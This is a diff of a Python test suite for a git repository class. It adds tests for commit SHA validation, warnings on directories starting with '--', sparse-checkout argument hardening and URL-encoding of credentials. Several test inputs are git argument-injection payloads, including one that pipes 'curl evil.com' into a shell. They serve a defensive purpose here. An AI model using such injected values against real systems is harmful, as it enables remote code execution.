@@ -198,6 +198,68 @@ class TestGitRepository:
                 credentials={"username": "oauth2"},
             )
 
+    @pytest.mark.parametrize(
+        "invalid_sha",
+        [
+            "--upload-pack=touch /tmp/pwned",
+            "--config=core.sshCommand=curl evil.com|sh",
+            "-c core.sshCommand=evil",
+            "not-a-hex-string",
+            "ghijkl",
+            "abc",  # too short (< 4 chars)
+            "a" * 65,  # too long (exceeds SHA-256 length)
+        ],
+    )
+    def test_init_rejects_invalid_commit_sha(self, invalid_sha: str):
+        with pytest.raises(ValueError, match="use the 'branch' parameter instead"):
+            GitRepository(
+                url="https://github.com/org/repo.git",
+                commit_sha=invalid_sha,
+            )
+
+    @pytest.mark.parametrize(
+        "valid_sha",
+        [
+            "abcd",  # 4-char short SHA
+            "1234567",
+            "1234567890",
+            "abcdef1234567890abcdef1234567890abcdef12",  # SHA-1 (40 chars)
+            "ABCDEF1234567890ABCDEF1234567890ABCDEF12",
+            "aAbBcCdD1234567890",
+            "a" * 64,  # SHA-256 (64 chars)
+        ],
+    )
+    def test_init_accepts_valid_commit_sha(self, valid_sha: str):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            commit_sha=valid_sha,
+        )
+        assert repo._commit_sha == valid_sha
+
+    @pytest.mark.parametrize(
+        "suspicious_dir",
+        [
+            "--config=core.sshCommand=curl http://evil.com|sh",
+            "--upload-pack=evil",
+        ],
+    )
+    def test_init_warns_on_directories_starting_with_double_dash(
+        self, suspicious_dir: str
+    ):
+        with pytest.warns(UserWarning, match="starts with '--'"):
+            repo = GitRepository(
+                url="https://github.com/org/repo.git",
+                directories=[suspicious_dir],
+            )
+        assert repo._directories == [suspicious_dir]
+
+    def test_init_accepts_valid_directories(self):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            directories=["src", "tests", "-flag-like-dir", "path/to/dir"],
+        )
+        assert repo._directories == ["src", "tests", "-flag-like-dir", "path/to/dir"]
+
     def test_init_with_name(self):
         repo = GitRepository(url="https://github.com/org/repo.git", name="custom-name")
         assert repo._name == "custom-name"
@@ -315,7 +377,7 @@ class TestGitRepository:
                 ]
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
         ]
@@ -349,7 +411,7 @@ class TestGitRepository:
                 cwd=Path.cwd() / "repo",
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
             call(["git", "pull", "origin", "--depth", "1"], cwd=Path.cwd() / "repo"),
@@ -853,6 +915,89 @@ class TestGitRepository:
                     "git",
                     "clone",
                     "https://deploy-user:deploy-token@gitlab.com/org/repo.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "repo"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_special_chars_in_username_and_password(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that dict credentials with special characters in username and
+            password are properly URL-encoded when constructing the git clone URL.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://bitbucket.test.com/scm/test/test.git",
+                credentials={
+                    "username": "user@domain.com",
+                    "password": "p@ss!word#123",
+                },
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://user%40domain.com:p%40ss%21word%23123@bitbucket.test.com/scm/test/test.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "test"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_bitbucket_server_token(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that BitBucket Server credentials in username:token format
+            are properly URL-encoded.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://bitbucketserver.example.com/scm/project/repo.git",
+                credentials={"token": "user@corp.com:token!with#special"},
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://user%40corp.com:token%21with%23special@bitbucketserver.example.com/scm/project/repo.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "repo"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_github_token(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that GitHub tokens with special characters are URL-encoded.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://github.com/org/repo.git",
+                credentials={"token": "ghp_token/with+special=chars"},
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://ghp_token%2Fwith%2Bspecial%3Dchars@github.com/org/repo.git",
                     "--depth",
                     "1",
                     str(Path.cwd() / "repo"),
